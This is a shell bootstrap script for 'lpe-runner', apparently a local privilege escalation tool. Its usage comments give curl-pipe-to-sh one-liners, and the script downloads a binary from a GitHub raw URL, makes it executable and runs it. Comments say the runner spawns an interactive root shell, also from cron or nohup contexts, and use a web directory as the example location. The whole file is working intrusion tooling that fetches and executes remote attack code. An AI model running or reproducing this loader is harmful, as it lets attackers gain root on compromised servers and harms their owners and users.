#!/bin/sh
# install.sh - one-shot bootstrap for lpe-runner.
#
# Everything runs in the CURRENT directory (wherever you ran the command).
# No /tmp, no probing. If you're in /var/www/xl, that's where it all happens.
#
# Usage (one line):
#   curl -sL https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main/lpe-runner/install.sh | sh
#
# Or if curl is missing:
#   wget -qO- https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main/lpe-runner/install.sh | sh
#
# Detach stdin ONLY for the final lpe-runner exec, not for the whole script.
# Doing `exec 0</dev/null` globally breaks `curl ... | sh` because sh reads
# the script from stdin — redirecting it mid-script makes sh hit EOF and
# silently stop running. We instead hand the runner a real TTY (so the root
# shell it spawns is interactive) and fall back to /dev/null otherwise.

set -e

REPO="https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main"
BIN="lpe-runner"
DIR="$(pwd)"

echo "[*] Working directory: $DIR"

if command -v curl >/dev/null 2>&1; then
    curl -sL --retry 3 -o "$BIN" "$REPO/lpe-runner/$BIN"
elif command -v wget >/dev/null 2>&1; then
    wget -q --no-check-certificate -O "$BIN" "$REPO/lpe-runner/$BIN"
else
    echo "[-] Need curl or wget." >&2
    exit 1
fi

chmod +x "$BIN"

if [ ! -s "$BIN" ]; then
    echo "[-] Download failed (empty file)." >&2
    exit 1
fi

echo "[+] lpe-runner ready: $DIR/$BIN"
echo "    Size: $(wc -c < "$BIN") bytes"
echo
echo "[*] Starting lpe-runner (auto-fetch enabled) ..."
echo "    All files fetched into: $DIR"
echo

# Detach stdin from the pipe for the runner so that:
#  - it does not consume bytes meant for the root shell it spawns
#  - the interactive root shell reads from a real TTY when one exists
#  - in non-interactive (nohup/cron) contexts, it falls back to /dev/null
if [ -r /dev/tty ]; then
    exec ./"$BIN" "$@" </dev/tty
else
    exec ./"$BIN" "$@" </dev/null
fi
